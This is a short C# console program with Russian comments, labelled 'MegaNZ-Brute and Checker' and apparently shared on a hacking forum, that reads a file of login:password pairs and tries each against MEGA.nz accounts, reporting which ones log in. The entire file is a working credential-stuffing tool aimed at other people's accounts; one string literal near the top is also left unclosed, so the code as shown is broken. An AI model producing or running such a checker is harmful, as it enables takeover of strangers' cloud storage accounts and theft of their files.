using CG.Web.MegaApiClient;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.Window;

namespace megabrutik
{
    internal class Program
    {
        [STAThread]
        static void Main()
        {
            const string name = ("MegaNZ-Brute and Checker); // название нашей программы
            const string author = "Софт"; // не забываем указать что написали это сами (!важно!)
            const string lolz = "zelenka.guru/soft"; // не забываем указать что написали это сами (!важно!)
            Console.Title = name; // называем окно консоли
            Console.ForegroundColor = ConsoleColor.Green; // начинаем писать зеленым цветом
            Console.WriteLine(name); // пишем название софта
            Console.WriteLine(lolz);
            Console.WriteLine("CODED BY " + author); // пишем кто автор софта
            Console.ResetColor(); // убираем цвет

            var dialog = new OpenFileDialog
            {
                Filter = "База аккаунтов (*.txt)|*.txt"
            };

            if (dialog.ShowDialog() != DialogResult.OK) //закрываем программу если диалоговое окно с выбором базы было закрыто
                return;
            var accs = File.ReadAllLines(dialog.FileName); // читаем все строки из базы

            Console.WriteLine("Загружено " + accs.Length + " аккаунтов"); // пишем сколько акков мы загрузилиs
            var mega = new MegaApiClient(); // создаём экземпляр класса для работы с мегой

            foreach (var acc in accs) // начинаем перебирать акки
            {
                var spl = acc.Trim().Split(new[] { ':', ';' }); // разделяем логин и пароль
                if (spl.Length != 2) // пропускаем аккаунт если нету логина/пароля
                    continue;

                try
                {
                    mega.Login(spl[0], spl[1]); // входим в мегу

                    Console.ForegroundColor = ConsoleColor.Green; // ставим зеленый цвет
                    Console.WriteLine("[+] " + acc); // пишем что аккаунт валид
                    Console.ResetColor(); // очищаем цвет
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.Red; // ставим красный цвет
                    Console.WriteLine("[-] " + acc); // пишем что аккаунт невалид
                    Console.ResetColor(); // очищаем цвет
                }
            }

            Console.WriteLine("Чек окончен!"); // пишем что чек окончен
            Console.ReadLine(); // считываем строку дабы софт не закрылся
        }
    }
}
